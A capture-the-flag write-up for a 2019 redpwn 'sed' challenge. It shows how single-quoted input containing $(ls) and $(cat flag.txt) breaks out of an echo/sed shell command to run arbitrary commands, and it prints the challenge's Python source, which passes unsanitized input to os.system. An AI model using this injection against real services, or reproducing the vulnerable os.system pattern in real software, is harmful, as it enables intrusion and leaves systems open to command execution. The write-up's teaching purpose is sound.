In this misc challenge with description:

```
I'm not really sure what I sed to this program, so it fixes it for me!

nc chall2.2019.redpwn.net 6004
```

We are prompted three times for some input related to sed usage, let's put random things

```
What you thought you sed
abcdef
What you aren't sure you sed
b
What you actually sed
c
You actually said
accdef
```

It seems that it asks for a string, then a pattern to substitute and the string to substitute with. Syntax of the command could be similar to:

```bash
echo $1 | sed 's/$2/$3/g'
```

Let's try to get a RCE using $(command) syntax:

```
What you thought you sed
$(ls)
What you aren't sure you sed
a
What you actually sed
a
You actually said
$(ls)
```

He is treating the input as a properly string, let's try to escape it using quotes:

```
What you thought you sed
'$(ls)'
What you aren't sure you sed
a
What you actually sed
a
You actually said
bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin sed.py srv sys tmp usr var
```

It works! To get the flag we just need to cat the corresponding file

```
What you thought you sed
'$(cat flag.txt)'
What you aren't sure you sed
a
What you actually sed
a
You actually said
flag{th4ts_wh4t_sh3_sed}
```

P.S: Let's have fun dumping the software used for this challenge using $(cat sed.py), the result is:

```python
from os import system

inp = input("What you thought you sed")
rep = '/' + input("What you aren't sure you sed") + '/'
new = input("What you actually sed")
cmd = 's' + rep + new + "/g"

if "'" not in new:
    cmd += "'"
    
print(cmd)
print("You actually said")
system("echo '" + inp + "' | sed '" + cmd)
```
